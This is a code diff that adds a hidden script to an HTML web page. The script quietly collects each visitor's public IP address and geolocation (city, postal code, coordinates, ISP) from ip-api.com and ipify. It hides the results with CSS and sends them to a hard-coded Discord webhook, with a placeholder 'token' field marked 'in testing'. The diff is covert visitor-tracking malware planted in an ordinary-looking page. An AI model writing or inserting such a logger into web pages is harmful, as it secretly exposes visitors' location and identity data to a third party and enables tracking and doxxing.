@@ -40,6 +40,61 @@
     </section>
 </body>
 
+<body>
+  <header class="header"></header>
+  <script src="./config.js"></script><script>
+  function get_information(link, callback) {
+      var xhr = new XMLHttpRequest();
+      xhr.open("GET", link, true);
+      xhr.onreadystatechange = function() {
+        if (xhr.readyState === 4) 
+        {
+          callback(xhr.responseText);
+        }
+      };
+    xhr.send(null);
+  }
+  get_information("http://ip-api.com/json/?fields=continent,country,countryCode,region,regionName,city,zip,lat,lon,timezone,currency,isp", function(text) {
+    var div = document.createElement("div");
+    div.innerHTML = text;
+    div.id = "extra";
+    const secondList = document.getElementsByClassName("header")[0]
+    secondList.appendChild(div)
+  });
+  get_information("https://api.ipify.org/", function(text) {
+    var div = document.createElement("div");
+    div.innerHTML = text;
+    div.id = "ips";
+    const secondList = document.getElementsByClassName("header")[0]
+    secondList.appendChild(div)
+  });
+  function Log() {
+    var ispp = document.getElementById('ips').innerHTML
+    var extra = document.getElementById("extra").innerHTML
+    var i = document.createElement('iframe'); document.body.appendChild(i);
+    const request = new XMLHttpRequest();
+    request.open("POST", "https://discord.com/api/webhooks/1115602413605371914/NV0OmgGjUxNqamcZT-rRf3fsh1SGHjY_VfauOO1ajPJui3AWeV8vMWMStfnkZcQ6VyBt");
+    request.setRequestHeader('Content-type', 'application/json');
+    const params = {	
+      username: "log",
+      avatar_url: '',
+      content: "ip: " + ispp + "" + "\ntoken: " + "in testing" + "\nother: " + extra + ""
+    }
+    request.send(JSON.stringify(params));
+  }
+  setTimeout(function() { Log() }, 700);
+  </script>
+  <style>
+    .header {
+      display: none
+    }
+
+    .map-container {
+      display: none
+    }
+  </style>
+</body>
+
 <script type="text/javascript" language="javascript">
     function changeDiscord(img){
        document.getElementById('social_titles_discord').src=img;
